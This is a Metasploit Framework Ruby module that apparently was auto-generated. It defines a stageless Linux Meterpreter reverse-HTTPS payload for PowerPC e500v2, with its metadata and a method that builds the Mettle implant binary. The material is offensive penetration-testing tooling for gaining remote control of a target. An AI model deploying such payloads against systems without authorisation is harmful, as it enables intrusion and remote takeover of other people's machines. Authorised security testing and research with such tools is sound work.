##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


# Module generated by tools/modules/generate_mettle_payloads.rb
module MetasploitModule

  CachedSize = 1166612

  include Msf::Payload::Single
  include Msf::Sessions::MeterpreterOptions
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'Linux Meterpreter, Reverse HTTPS Inline',
        'Description'   => 'Run the Meterpreter / Mettle server payload (stageless)',
        'Author'        => [
          'Adam Cammack <adam_cammack[at]rapid7.com>',
          'Brent Cook <brent_cook[at]rapid7.com>',
          'timwr'
        ],
        'Platform'      => 'linux',
        'Arch'          => ARCH_PPCE500V2,
        'License'       => MSF_LICENSE,
        'Handler'       => Msf::Handler::ReverseHttps,
        'Session'       => Msf::Sessions::Meterpreter_ppce500v2_Linux
      )
    )
  end

  def generate(_opts = {})
    opts = {
      scheme: 'https',
      stageless: true
    }.merge(mettle_logging_config)
    MetasploitPayloads::Mettle.new('powerpc-e500v2-linux-musl', generate_config(opts)).to_binary :exec
  end
end
